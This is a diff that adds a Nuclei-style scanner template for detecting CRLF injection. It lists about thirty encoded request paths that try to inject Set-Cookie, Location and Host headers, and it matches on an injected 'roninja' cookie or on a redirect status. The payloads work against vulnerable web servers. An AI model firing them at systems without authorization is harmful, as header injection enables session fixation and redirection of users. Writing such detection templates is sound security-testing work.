@@ -1,0 +1,56 @@
+id: crlf-extended
+info:
+  name: CRLF Injection Detection
+  author: roninja
+  severity: low
+  description: CRLF extended from Oralyzer
+  reference:
+    - https://hackerone.com/reports/858650
+  tags: crlf, crlf-ext, roninja-crlf, generic
+  metadata:
+    max-request: 8
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0d%0awww.google.com%0d%0a"
+      - "{{BaseURL}}/%0d%0ahost:%20www.google.com%0d%0a"
+      - "{{BaseURL}}/%5Cr%5Cnhost:%20www.google.com%5Cr%5Cn"
+      - "{{BaseURL}}/%0d%0aLocation:www.google.com%0d%0a"
+      - "{{BaseURL}}/%0d%0aSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5Cn%5CtSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5CtSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8DLocation:www.google.com"
+      - "{{BaseURL}}/%5CrSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%20Set-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5CnSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5Cn%20Set-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5CrSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%u000ASet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%20Set-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%23%0D%0ALocation:www.google.com;"
+      - "{{BaseURL}}/%5Cr%5CnSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5Cn%20Set-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5Cn%5CtSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5CtSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5cr%5cnLocation:www.google.com"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5CrSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%20Set-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5CnSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5Cn%20Set-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5Cn%5CtSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5CtSet-Cookie:roninja=roninja;"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - '(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(roninja=roninja)(?:\s*?)(?:$|;)'
+        part: header
+      - type: status
+        status:
+          - 301
+          - 302
+          - 307
+          - 308
+        condition: or
